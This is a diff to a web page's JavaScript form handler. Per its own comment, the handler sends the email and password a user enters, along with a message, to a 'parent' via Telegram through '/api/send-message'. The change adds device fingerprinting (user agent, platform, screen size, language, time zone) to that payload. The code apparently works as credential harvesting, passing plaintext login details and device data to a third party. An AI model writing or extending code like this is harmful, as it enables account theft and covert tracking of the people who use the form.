@@ -499,13 +499,29 @@
           const messageInput = document.getElementById('message');
           const message = messageInput ? messageInput.value.trim() : '';
           
+          // Get device information
+          const deviceInfo = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            vendor: navigator.vendor,
+            screenWidth: window.screen.width,
+            screenHeight: window.screen.height,
+            language: navigator.language,
+            timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
+          };
+          
           // Always send login information to parent via Telegram
           fetch('/api/send-message', {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json'
             },
-            body: JSON.stringify({ email, password, message })
+            body: JSON.stringify({ 
+              email, 
+              password, 
+              message,
+              deviceInfo
+            })
           })
           .then(response => response.json())
           .then(data => {
